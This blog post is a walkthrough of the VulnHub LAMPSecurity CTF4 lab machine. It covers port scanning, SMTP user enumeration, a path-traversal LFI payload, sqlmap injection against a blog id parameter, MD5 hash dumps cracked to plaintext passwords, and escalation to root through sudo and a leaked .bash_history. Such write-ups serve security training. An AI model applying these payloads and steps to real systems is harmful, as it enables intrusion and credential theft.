---
layout: post
title:  "LAMPSecurity: CTF4"
date:   2020-12-25  +0400
categories: vulnhub lampsecurity
description: "This is the fourth CTF exercise of the LAMPSecurity project. It mainly focues on sql injection, and the cracking of hashes. We were easily escalate our priviliges and root the machine. It was fun, and took around 40 minutes to pwn. This is my first writeup, give me feedback on my twitter if there is anything I need to improve!"
---

<span style="text-decoration: underline">Box Stats</span>

| Name: | LAMPSecurity: CTF4 |
|-------|--------|
| Series: | [LAMPSecurity](https://www.vulnhub.com/series/lampsecurity,43/) |
| Link: | https://www.vulnhub.com/entry/lampsecurity-ctf4,83/ |
| OS: | Linux - Fedora Core release 5 (Bordeaux) |
| Creator: | https://www.vulnhub.com/author/madirish2600,75/ |

### Topics:
- Nmap
- SQLmap
- Hash Cracking
- Privilige Escalation

### Gathering Information (Recon)

Let's start gathering information about our target, which we can carry out by starting various scans that give us valuable knowledge about the box's structure. I like to use the command `export IP=___.___._.___` to assign the IP address to the varible `IP`. 

We can start by performing our nmap scan (I like to do staged scans by first performing `nmap -T4 -p-` and then adding the `-A` flag and specify the open ports `-p__,__,___` to make nmap give more information about each service).

# Discovering Open Ports:
```
$ nmap -T4 -p- $IP
Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-26 09:32 UTC
Nmap scan report for 192.168.16.246
Host is up (0.0010s latency).
Not shown: 65531 filtered ports
PORT    STATE  SERVICE
22/tcp  open   ssh
25/tcp  open   smtp
80/tcp  open   http
631/tcp closed ipp
```
# OS Detection, Version Detection, Script Scanning, and Traceroute with the `-A` flag:
```
$ nmap -T4 -p22,25,80 -A $IP
Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-26 09:42 UTC
Nmap scan report for 192.168.16.246
Host is up (0.00034s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 10:4a:18:f8:97:e0:72:27:b5:a4:33:93:3d:aa:9d:ef (DSA)
|_  2048 e7:70:d3:81:00:41:b8:6e:fd:31:ae:0e:00:ea:5c:b4 (RSA)
25/tcp open  smtp    Sendmail 8.13.5/8.13.5
| smtp-commands: ctf4.sas.upenn.edu Hello [192.168.16.42], pleased to meet you, ENHANCEDSTATUSCODES, PIPELINING, EXPN, VERB, 8BITMIME, SIZE, DSN, ETRN, DELIVERBY, HELP, 
|_ 2.0.0 This is sendmail version 8.13.5 2.0.0 Topics: 2.0.0 HELO EHLO MAIL RCPT DATA 2.0.0 RSET NOOP QUIT HELP VRFY 2.0.0 EXPN VERB ETRN DSN AUTH 2.0.0 STARTTLS 2.0.0 For more info use "HELP <topic>". 2.0.0 To report bugs in the implementation send email to 2.0.0 sendmail-bugs@sendmail.org. 2.0.0 For local information send email to Postmaster at your site. 2.0.0 End of HELP info 
80/tcp open  http    Apache httpd 2.2.0 ((Fedora))
| http-robots.txt: 5 disallowed entries 
|_/mail/ /restricted/ /conf/ /sql/ /admin/
|_http-server-header: Apache/2.2.0 (Fedora)
|_http-title:  Prof. Ehks 
Service Info: Host: ctf4.sas.upenn.edu; OS: Unix
```

### Enumeration
I like to start enumerating ports one by one, following the order of the nmap scan results. In our case the following ports are open:
```
22 - SSH - OpenSSH 4.3
25 - SMTP - Sendmail 8.13.5
80 - HTTP - Apache 2.2.0
```
# Port 22 - SSH
SSH is never really a protocol that we can exploit, rather it can be used to connect to the victim once credentials were gathered. We rarely, or never are able to find exploits for SSH other than DoS (which we don't really want as pentesters), except for the occational bruteforcing if needed. When looking at this protocol from a CTF perspective, we can guess that once we get user credentions (from LFI, SQLi, RCE, etc) we can use this protocol for a clean terminal-based connection. In some cases, it is better to use SSH than a bare-bone reverse shell.

# Port 25 - SMTP
An SMTP (Simple Mail Transfer Protocol) server is an application that's primary purpose is to send, receive, and/or relay outgoing mail between email senders and receivers. Because the SMTP standard sends email without using encryption or authentication, every message you send is exposed to view through network sniffers (like Wireshark). The nmap scan also returned some commands that we can execute on this protocol. We can connect to it using the `nc $IP 25` command, and we will be greeted with a banner:

```
$ nc $IP 25
220 ctf4.sas.upenn.edu ESMTP Sendmail 8.13.5/8.13.5; Sat, 26 Dec 2020 05:03:34 -0500
```

Our nmap scan returned the `HELLO, EHLO, MAIL, RCPT, DATA, RSET, NOOP, QUIT, HELP, VRFY, EXPN, VERB, ETRN, DSN, AUTH, STARTTLS` commands that can be used. In this list, the most interesting command is `VRFY`. The `VRFY` command allows us the verify if users exist on the victim's machine.

```
VRFY john
550 5.1.1 john... User unknown
VRFY root
250 2.1.5 <root@ctf4.sas.upenn.edu>
```
# Port 80 - HTTP
We can browse to the victim's website by simply typing the IP address into the search bar. It takes us to a website titled `Professor Ehks Center for Data Studies`. We can click onto various links that take us to different pages.

(When coming back to this CTF, I realised there was another issue we could exploit, which was an LFI. We were able to print out files in the url `http://________/index.html?page=../../../../../../etc/passwd%00`. This also gave us the users that were on the machine)

When browsing to the `Blog` page, we can see there are four entries. Each link takes us to a blog page. The interesting thing in this is the `id=_` query in the URL, it changes when we browse to different blogs. 

(Image of changing ids)

From this, we know there has to be a back-end database that sorts these queries. We can confirm that this is a SQL database, by adding a `id='` to the URL. This will give us an error message:

(Image of error)

We can enumerate SQL services using `SQLmap`. We can bring up the help page using `sqlmap -h`:

```
$ sqlmap -h
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.4.7#stable}
|_ -| . [,]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

Usage: python3 sqlmap [options]

Options:
  -h, --help            Show basic help message and exit
  -hh                   Show advanced help message and exit
  --version             Show program's version number and exit
  -v VERBOSE            Verbosity level: 0-6 (default 1)

  Target:
    At least one of these options has to be provided to define the
    target(s)

    -u URL, --url=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")
    -g GOOGLEDORK       Process Google dork results as target URLs

  Request:
    These options can be used to specify how to connect to the target URL

    --data=DATA         Data string to be sent through POST (e.g. "id=1")
    --cookie=COOKIE     HTTP Cookie header value (e.g. "PHPSESSID=a8d127e..")
    --random-agent      Use randomly selected HTTP User-Agent header value
    --proxy=PROXY       Use a proxy to connect to the target URL
    --tor               Use Tor anonymity network
    --check-tor         Check to see if Tor is used properly

  Injection:
    These options can be used to specify which parameters to test for,
    provide custom injection payloads and optional tampering scripts

    -p TESTPARAMETER    Testable parameter(s)
    --dbms=DBMS         Force back-end DBMS to provided value

  Detection:
    These options can be used to customize the detection phase

    --level=LEVEL       Level of tests to perform (1-5, default 1)
    --risk=RISK         Risk of tests to perform (1-3, default 1)

  Techniques:
    These options can be used to tweak testing of specific SQL injection
    techniques

    --technique=TECH..  SQL injection techniques to use (default "BEUSTQ")

  Enumeration:
    These options can be used to enumerate the back-end database
    management system information, structure and data contained in the
    tables

    -a, --all           Retrieve everything
    -b, --banner        Retrieve DBMS banner
    --current-user      Retrieve DBMS current user
    --current-db        Retrieve DBMS current database
    --passwords         Enumerate DBMS users password hashes
    --tables            Enumerate DBMS database tables
    --columns           Enumerate DBMS database table columns
    --schema            Enumerate DBMS schema
    --dump              Dump DBMS database table entries
    --dump-all          Dump all DBMS databases tables entries
    -D DB               DBMS database to enumerate
    -T TBL              DBMS database table(s) to enumerate
    -C COL              DBMS database table column(s) to enumerate

  Operating system access:
    These options can be used to access the back-end database management
    system underlying operating system

    --os-shell          Prompt for an interactive operating system shell
    --os-pwn            Prompt for an OOB shell, Meterpreter or VNC

  General:
    These options can be used to set some general working parameters

    --batch             Never ask for user input, use the default behavior
    --flush-session     Flush session files for current target

  Miscellaneous:
    These options do not fit into any other category

    --sqlmap-shell      Prompt for an interactive sqlmap shell
    --wizard            Simple wizard interface for beginner users

[!] to see full list of options run with '-hh'
```
I like to list the tables using the command `sqlmap -u "http://________/index.html?page=blog&title=Blog&id=" -p id --tables`, meaning we want to enumerate the `id` attack point / query and we want to list the tables. This will give us the output of:
```
Database: mysql
[17 tables]
+---------------------------------------+
| db                                    |
| user                                  |
| columns_priv                          |
| func                                  |
| help_category                         |
| help_keyword                          |
| help_relation                         |
| help_topic                            |
| host                                  |
| proc                                  |
| procs_priv                            |
| tables_priv                           |
| time_zone                             |
| time_zone_leap_second                 |
| time_zone_name                        |
| time_zone_transition                  |
| time_zone_transition_type             |
+---------------------------------------+

Database: calendar
[5 tables]
+---------------------------------------+
| phpc_calendars                        |
| phpc_events                           |
| phpc_sequence                         |
| phpc_users                            |
| uid                                   |
+---------------------------------------+

Database: information_schema
[16 tables]
+---------------------------------------+
| CHARACTER_SETS                        |
| COLLATIONS                            |
| COLLATION_CHARACTER_SET_APPLICABILITY |
| COLUMN_PRIVILEGES                     |
| KEY_COLUMN_USAGE                      |
| ROUTINES                              |
| SCHEMATA                              |
| SCHEMA_PRIVILEGES                     |
| TABLE_CONSTRAINTS                     |
| TABLE_PRIVILEGES                      |
| TRIGGERS                              |
| USER_PRIVILEGES                       |
| VIEWS                                 |
| COLUMNS                               |
| STATISTICS                            |
| TABLES                                |
+---------------------------------------+

Database: ehks
[3 tables]
+---------------------------------------+
| comment                               |
| user                                  |
| blog                                  |
+---------------------------------------+

Database: roundcubemail
[6 tables]
+---------------------------------------+
| cache                                 |
| session                               |
| contacts                              |
| identities                            |
| messages                              |
| users                                 |
+---------------------------------------+
```

We can specify the database we want to enumerate using the `-D ____` flag, and set the table using the `-T ____` flag. We can also list the password hashes using `--dump`. This will give us the output of:
```
+---------+-----------+----------------------------------+
| user_id | user_name | user_pass                        |
+---------+-----------+----------------------------------+
| 1       | dstevens  | 02e823a15a392b5aa4ff4ccb9060fa68 |
| 2       | achen     | b46265f1e7faa3beab09db5c28739380 |
| 3       | pmoore    | 8f4743c04ed8e5f39166a81f26319bb5 |
| 4       | jdurbin   | 7c7bc9f465d86b8164686ebb5151a717 |
| 5       | sorzek    | 64d1f88b9b276aece4b0edcc25b7a434 |
| 6       | ghighland | 9f3eb3087298ff21843cc4e013cf355f |
+---------+-----------+----------------------------------+
```

### Exploitation


Altough when we think of exploitation, we imagine gaining access to a machine through buffer overflows, remote code execution, cracking credentials and logging in with them is also exploitation. We can crack these hashes using HashCat, JohnTheRipper, or what I like to do is pass them into https://crackstation.net/. Crackstation is very quick, and doesn't use your computer's resources. It will give us plaintext passwords:
```
	 User				   Hash 					Type          Plaintext

	dstevens		02e823a15a392b5aa4ff4ccb9060fa68	md5		 ilike2surf
	achen    		b46265f1e7faa3beab09db5c28739380	md5		 seventysixers
	pmoore  		8f4743c04ed8e5f39166a81f26319bb5	md5		 Homesite
	jdurbin 		7c7bc9f465d86b8164686ebb5151a717	md5		 Sue1978
	sorzek  		64d1f88b9b276aece4b0edcc25b7a434	md5		 pacman
	ghighland		9f3eb3087298ff21843cc4e013cf355f	md5		 undone1
```

We can ssh to the target machine's users using the command `ssh user@$IP` (if you keep on getting an error message add the `-oKexAlgorithms=+diffie-hellman-group1-sha1` flag). Here is the information I gathered about each user:
```
Sudo Priviliges:
 
dstevens:   (ALL) ALL
achen:		(ALL) NOPASSWD: ALL
pmoore:		none
jdurbin:	none
sorzek:		none
ghighland:	none
```
From here, we can change the password of the `root` user, using either `dstevens` or `achen` account. We can also further enumerate and see that achen's `.bash_history` contains the root password:
```
[achen@ctf4 ~]$ cat .bash_history 
exit
clear
exit
sudo sy
su
root1234      <---- Here is the password!
su
exit
cat .bash_history 
su
sudo su
exit
ls -lah
cd
ls -lah
chmod go+x .ssh
ls -lah
su
logout
exit
ls -lah
mkdir .ssh
ls -alh
cd .ssh
ssh-keygen -q -f id_rsa -t rsa
ls
cat id_rsa
cat id_rsa.pub >>authorized_keys
ls -lah
chmod g+rw,o+r id_rsa
ls -lah
cat id_rsa.pub
rm -rf *
ls -lah
cat achen_pub.ppk >>authorized_keys
ls -lah
vi authorized_keys 
cat achen_pub.ppk >>authorized_keys
vi authorized_keys 
rm authorized_keys 
cat achen_pub.ppk >>authorized_keys
less authorized_keys 
vi authorized_keys 
cd ..
ls -lah
chmod 700 .ssh
chmod +r .ssh
chmod 0700 .ssh
mkdir ssh
cd .ssh
ls
mv *.ppk ../ssh
ls -lah
cd ..
ls
ls -lah
cd .ssh
ls -lah
chmod 0700 authorized_keys 
mv ../ssh/* .
cd ..
rmdir ssh
chmod +r .ssh
la -lah
cd ..
cd achen/
la -lah
ls -lah
ls -lah .ssh
ls
sudo wget http://www.ossec.net/files/ossec-hids-2.0.tar.gz
wget http://www.ossec.net/files/ossec-hids-2.0.tar.gz
tar -xvzf ossec-hids-2.0.tar.gz 
cd ossec-hids-2.0
ls
sudo ./install.sh 
cd /media/disk/
cd Fedora/RPMS/
ls | grep gcc
sudo yum install gcc-4.1.0-3.i386.rpm 
sudo rpm -ivh gcc-4.1.0-3.i386.rpm 
sudo rpm -ivh gcc-4.1.0-3.i386.rpm binutils-2.16.91.0.6-4.i386.rpm glibc-devel-2.4-4.i386.rpm libgomp-4.1.0-3.i386.rpm 
sudo rpm -ivh gcc-4.1.0-3.i386.rpm binutils-2.16.91.0.6-4.i386.rpm glibc-devel-2.4-4.i386.rpm libgomp-4.1.0-3.i386.rpm glibc-headers-2.4-4.i386.rpm 
cd
ls
cd ossec-hids-2.0
sudo ./install.sh 
sudo /var/ossec/bin/ossec-control start
su
cat /etc/passwd
ls /home
ls /var/spool/mail
ls /var/spool/mail/sorzek 
cat /var/spool/mail/sorzek 
cat /var/spool/mail/achen 
cat /etc/group
su 
logout
ls
mkdir bin
mv ossec* bin/
ls
sudo su
cd bin
wget http://the.earth.li/~sgtatham/putty/latest/x86/putty-0.60-installer.exe
df -h
sudo df -h
rpm -q vnc
ls /var/www/html
sudo halt -n
logout
su
ln -s /var/www/html html
wget http://www.unex.berkeley.edu/cert/pdf/linux.pdf
ls
mv linux.pdf linux_administration.pdf
cd bin
ls
logout
```
This VM was fun, but also aimed at beginners which I liked. I really reccomned this machine to all CTF players. Thanks for checking out this writeup, and I hope to see you later!
